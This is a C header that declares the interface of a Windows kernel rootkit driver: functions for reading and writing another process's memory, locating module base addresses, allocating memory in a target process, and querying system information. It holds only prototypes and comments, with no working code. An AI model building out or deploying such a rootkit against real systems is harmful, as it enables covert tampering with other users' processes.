#pragma once
#include "memory.h"

RKSYSTEM_INFORET GetModuleBaseRK(PEPROCESS Process, UNICODE_STRING ModuleName);  // get the base address of a process in memory (i.e notepad.exe)
NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst);  // write into memory (UM-UM, supports user supplied buffers from ActClient)
NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst);  // read from memory (UM-MainMedium)
void PrintDbgMsgRK(const char* Message);  // print a debug string to a kernel debugger (i.e windbg)
ROOTKIT_STATUS RetSystemInfoRK(PVOID DstBuffer, PVOID SrcBuffer, ULONG BufferSize, DWORD RequestNum);  // return the system information that was requested before (part 2)
RKSYSTEM_INFORET RequestSystemInfoRK(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum);  // request specific system information (part 1)
NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst);  // allocate specified memory in a memory range in a process virtual address space